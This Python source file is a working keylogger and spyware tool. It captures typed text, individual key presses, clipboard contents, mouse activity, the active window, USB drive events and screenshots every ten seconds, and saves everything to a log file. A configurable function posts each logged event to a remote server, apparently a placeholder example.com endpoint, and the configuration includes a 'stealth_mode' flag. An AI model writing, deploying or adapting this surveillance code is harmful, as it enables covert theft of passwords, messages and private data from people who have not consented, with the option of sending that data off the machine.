import os
import platform
import psutil
import logging
import time
import os
import threading
import json
from collections import deque, defaultdict
from cryptography.fernet import Fernet
from pynput import keyboard, mouse
from PIL import ImageGrab
import requests
import string

# Windows-specific imports
if platform.system() == "Windows":
    try:
        import win32file
        import win32con
        import win32gui
        import win32process
    except ImportError:
        logging.error("win32gui or win32process not found. Please install pywin32.")

# Clipboard monitoring
try:
    import pyperclip
    clipboard_available = True
except ImportError:
    clipboard_available = False
    logging.warning("pyperclip not installed. Clipboard monitoring will be disabled.")

# Generate a key for encryption (in production, store the key securely)
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Configure logging to a file and console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s: %(message)s',
    handlers=[
        logging.FileHandler("keylog.txt"),
        logging.StreamHandler()
    ]
)
logging.getLogger().handlers[1].setLevel(logging.INFO)
current_text = deque()
log_buffer = deque()
active_window_name = None
active_window_start_time = time.time()
pressed_keys = set()
clipboard_content = None
usage_stats = defaultdict(float)
stop_event = threading.Event()

def get_active_window_process_name() -> str:
    """Returns the active window's process name and title."""
    try:
        if platform.system() == "Windows":
            window_handle = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(window_handle)
            _, pid = win32process.GetWindowThreadProcessId(window_handle)
            process = psutil.Process(pid)
            return f"{process.name()} - {window_title}"
        
        else:
            return psutil.Process(os.getpid()).name()
    except Exception as e:
        logging.error(f"Error getting active window process name: {e}")
        return "Unknown"

active_window_name = get_active_window_process_name()

def log_event(message: str) -> None:
    """Log message to both file and terminal in real-time."""
    logging.info(message)
    log_buffer.append(message)
    send_remote_log(message)
    if len(log_buffer) >= 10:
        flush_log_buffer()

def flush_log_buffer() -> None:
    """Write all buffered events to the log file."""
    with open("keylog.txt", "a") as log_file:
        while log_buffer:
            log_file.write(log_buffer.popleft() + "\n")

def log_time_spent_on_window(window_name: str, start_time: float) -> None:
    """Log the time spent on a given window and update usage statistics."""
    time_spent = time.time() - start_time
    usage_stats[window_name] += time_spent
    log_event(f"Time spent on {window_name}: {time_spent:.2f} seconds")

def handle_window_change() -> None:
    """Check if the active window has changed and log the time spent on the previous one."""
    global active_window_name, active_window_start_time
    new_window_name = get_active_window_process_name()
    if new_window_name != active_window_name:
        if active_window_name is not None:
            log_time_spent_on_window(active_window_name, active_window_start_time)
        active_window_name = new_window_name
        active_window_start_time = time.time()

def on_press(key) -> None:
    """Handle key press events."""
    try:
        handle_window_change()
        pressed_keys.add(key)
        log_event(f"Key pressed: {key} in {active_window_name}")
    except Exception as e:
        logging.error(f"Error in on_press: {e}")

def on_release(key) -> None:
    """Handle key release events and capture text input."""
    try:
        handle_window_change()
        if hasattr(key, 'char') and key.char is not None:
            current_text.append(key.char)
        elif key == keyboard.Key.space:
            current_text.append(' ')
        elif key == keyboard.Key.enter:
            current_text.append('\n')

        if key in {keyboard.Key.space, keyboard.Key.enter}:
            text_input = ''.join(current_text).strip()
            if text_input:
                log_event(f"Text input: {text_input} in {active_window_name}")
            current_text.clear()

        log_event(f"Key released: {key} in {active_window_name}")
        pressed_keys.discard(key)
        if pressed_keys:
            log_event(f"Shortcut used: {', '.join(str(k) for k in pressed_keys)} in {active_window_name}")

        if key == keyboard.Key.esc:
            stop_listeners()
            return None
    except Exception as e:
        logging.error(f"Error in on_release: {e}")

def on_click(x: int, y: int, button, pressed: bool) -> None:
    """Handle mouse click events."""
    try:
        handle_window_change()
        action = "pressed" if pressed else "released"
        log_event(f"Mouse {action} at ({x}, {y}) with {button} in {active_window_name}")
    except Exception as e:
        logging.error(f"Error in on_click: {e}")

def on_scroll(x: int, y: int, dx: int, dy: int) -> None:
    """Handle mouse scroll events."""
    try:
        handle_window_change()
        log_event(f"Mouse scrolled at ({x}, {y}) with delta ({dx}, {dy}) in {active_window_name}")
    except Exception as e:
        logging.error(f"Error in on_scroll: {e}")

def stop_listeners() -> None:
    """Stop all listeners and signal the clipboard thread to stop."""
    try:
        stop_event.set()
        keyboard_listener.stop()
        mouse_listener.stop()
        key_combination_listener.stop()
        if clipboard_available and 'clipboard_thread' in globals():
            stop_event.set()  # Signal the clipboard thread to stop using the shared event
    except Exception as e:
        logging.error(f"Error stopping listeners: {e}")

def on_key_combination(key) -> None:
    """Stop listeners if Ctrl+C is detected."""
    try:
        if key == keyboard.KeyCode.from_char('\x03'):
            stop_listeners()
            return None
    except Exception as e:
        logging.error(f"Error in on_key_combination: {e}")

def periodic_flush() -> None:
    """Flush the log buffer to disk every 10 seconds."""
    while not stop_event.is_set():
        time.sleep(10)
        flush_log_buffer()

def log_active_window() -> None:
    """Log the active window every 5 seconds."""
    while not stop_event.is_set():
        time.sleep(5)
        handle_window_change()
        log_event(f"Active window: {active_window_name}")

def monitor_clipboard() -> None:
    """Monitor clipboard changes and log them."""
    global clipboard_content
    clipboard_content = pyperclip.paste() if clipboard_available else None
    while not stop_event.is_set():  # Check the shared stop event
        time.sleep(3)
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != clipboard_content:
                clipboard_content = current_clipboard
                log_event(f"Clipboard changed: {current_clipboard} in {active_window_name}")
        except Exception as e:
            logging.error(f"Error monitoring clipboard: {e}")

SCREENSHOT_DIR = "screenshots"

def capture_screenshot() -> None:
    """Capture a screenshot and save it to a file in the screenshots directory."""
    try:
        # Ensure the screenshot directory exists
        if not os.path.exists(SCREENSHOT_DIR):
            os.makedirs(SCREENSHOT_DIR)

        screenshot = ImageGrab.grab()
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        file_name = f"screenshot_{timestamp}.png"
        file_path = os.path.join(SCREENSHOT_DIR, file_name)
        screenshot.save(file_path)
        log_event(f"Screenshot captured: {file_path}")
    except Exception as e:
        logging.error(f"Error capturing screenshot: {e}")

def periodic_screenshot_capture(interval: int = 10) -> None:
    """Capture screenshots at regular intervals."""
    while not stop_event.is_set():
        capture_screenshot()
        time.sleep(interval)

def log_network_activity(url: str) -> None:
    """Log network activity such as visited URLs."""
    try:
        response = requests.get(url)
        log_event(f"Visited URL: {url} - Status Code: {response.status_code}")
    except Exception as e:
        logging.error(f"Error logging network activity: {e}")

def display_usage_statistics() -> None:
    """Display the application usage statistics."""
    print("\n--- Application Usage Statistics ---\n")
    for window, duration in usage_stats.items():
        print(f"{window}: {duration:.2f} seconds")
    print("\n--- End of Statistics ---\n")

def get_drive_letters(bitmask):
    """Convert bitmask to a set of drive letters."""
    drives = set()
    for i in range(26):
        if bitmask & (1 << i):
            drives.add(f"{string.ascii_uppercase[i]}:\\")
    return drives

def monitor_usb_devices() -> None:
    """Monitor USB device connections and disconnections."""
    drive_list = get_drive_letters(win32file.GetLogicalDrives())
    while not stop_event.is_set():
        time.sleep(1)
        new_drive_list = get_drive_letters(win32file.GetLogicalDrives())
        added_drives = new_drive_list - drive_list
        removed_drives = drive_list - new_drive_list
        for drive in added_drives:
            log_event(f"USB device connected: {drive}")
        for drive in removed_drives:
            log_event(f"USB device disconnected: {drive}")
        drive_list = new_drive_list

# Configuration settings
config = {
    "remote_logging": False,
    "remote_server": "http://example.com/log",
    "stealth_mode": False,
    "email_alerts": False,
    "email_recipient": "",
    "features": {
        "key_logging": True,
        "mouse_logging": True,
        "clipboard_logging": True,
        "screenshots": True,
        "usb_monitoring": True,
        "network_logging": True
    }
}

def load_config(config_file="config.json"):
    """Load configuration from JSON file."""
    global config
    try:
        with open(config_file) as f:
            config.update(json.load(f))
    except Exception as e:
        logging.error(f"Error loading config: {e}")

def send_remote_log(message):
    """Send log message to remote server if enabled."""
    if config["remote_logging"]:
        try:
            requests.post(config["remote_server"], 
                         json={"log": message, "timestamp": time.time()})
        except Exception as e:
            logging.error(f"Remote logging failed: {e}")

# --- Set up Listeners and Threads ---
try:
    keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    keyboard_listener.start()
except Exception as e:
    logging.error(f"Error setting up keyboard listener: {e}")

try:
    mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
    mouse_listener.start()
except Exception as e:
    logging.error(f"Error setting up mouse listener: {e}")

try:
    key_combination_listener = keyboard.Listener(on_press=on_key_combination)
    key_combination_listener.start()
except Exception as e:
    logging.error(f"Error setting up key combination listener: {e}")

flush_thread = threading.Thread(target=periodic_flush, daemon=True)
flush_thread.start()

active_window_thread = threading.Thread(target=log_active_window, daemon=True)
active_window_thread.start()

if clipboard_available:
    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    # No need to set 'do_run' anymore
    clipboard_thread.start()

screenshot_thread = threading.Thread(target=periodic_screenshot_capture, daemon=True)
screenshot_thread.start()

usb_thread = threading.Thread(target=monitor_usb_devices, daemon=True)
usb_thread.start()

# Main loop: block until listeners are stopped
try:
    # Wait for the non-daemon listeners to finish
    keyboard_listener.join()
    mouse_listener.join()
    key_combination_listener.join()

    # Daemon threads (flush, active_window, clipboard, screenshot, usb)
    # will exit automatically when the main thread and listeners finish.
    # No need to explicitly join them.
except Exception as e:
    logging.error(f"Error joining listeners: {e}")

# Final flush of any remaining log messages
flush_log_buffer()

# Encrypt the log file
try:
    with open("keylog.txt", "rb") as file:
        log_data = file.read()
    encrypted_data = cipher_suite.encrypt(log_data)
    with open("keylog.enc", "wb") as file:
        file.write(encrypted_data)
    print("Log file encrypted as 'keylog.enc'.")
except Exception as e:
    logging.error(f"Error encrypting log file: {e}")

# Display usage statistics
display_usage_statistics()